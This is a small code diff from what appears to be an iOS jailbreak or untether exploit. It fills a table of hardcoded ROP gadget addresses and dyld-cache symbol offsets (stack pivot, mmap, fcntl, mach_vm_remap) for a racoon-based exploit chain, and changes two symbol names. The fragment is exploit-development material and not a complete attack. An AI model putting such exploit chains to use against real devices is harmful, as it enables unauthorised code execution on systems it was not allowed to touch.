@@ -26,7 +26,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
     myoffsets.memmove = 0x1ab680d20;
     myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp");
     myoffsets.stack_pivot = 0x180b12714;
-    myoffsets.mmap = realsym(dyld_cache_path,"__mmap");
+    myoffsets.mmap = realsym(dyld_cache_path,"___mmap");
     myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy");
     myoffsets.open = realsym(dyld_cache_path,"_open");
     myoffsets.max_slide = 0x4810000;
@@ -42,7 +42,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
     myoffsets.cbz_x0_gadget = 0x188cffe5c;
     myoffsets.cbz_x0_x16_load = 0x1b1c0e000+0x2c8;
     myoffsets.add_x0_gadget = 0x18518bb90;
-    myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"__fcntl");
+    myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"___fcntl");
     myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remap");
     myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
     myoffsets.new_cache_addr = 0x1c0000000;
